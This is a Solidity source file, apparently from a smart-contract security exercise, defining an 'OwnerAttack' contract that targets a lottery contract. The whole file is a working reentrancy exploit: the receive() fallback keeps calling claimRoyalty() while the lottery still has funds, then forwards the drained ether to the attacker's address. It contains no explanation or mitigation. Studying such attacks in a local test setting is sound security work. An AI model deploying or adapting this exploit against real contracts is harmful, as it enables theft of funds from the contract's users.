// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import "@ganache/console.log/console.sol";


interface ILottery {
    function bet() external payable;
    function claimPrize(uint _week) external;
    function claimRoyalty() external;
}

contract OwnerAttack {
    modifier onlyOwner() {
        require(msg.sender == owner, "Attack Only owner can perform this action");
        _;
    }
  address owner;
  ILottery public immutable lotteryContract;

  constructor(address _lotteryContractAddress) {
    lotteryContract = ILottery(_lotteryContractAddress);
    owner = msg.sender;
  }

  function bet() external payable onlyOwner {
    lotteryContract.bet{value:msg.value}();
  }

  // function claimRoyalty() external onlyOwner {
  //   lotteryContract.claimRoyalty();
  // }

  function attack() external payable onlyOwner {
    lotteryContract.claimRoyalty();
  }

  receive() external payable {
    if (address(lotteryContract).balance >= msg.value) {
      lotteryContract.claimRoyalty();
    } else {
      payable(owner).transfer(address(this).balance);
    }
  }
}




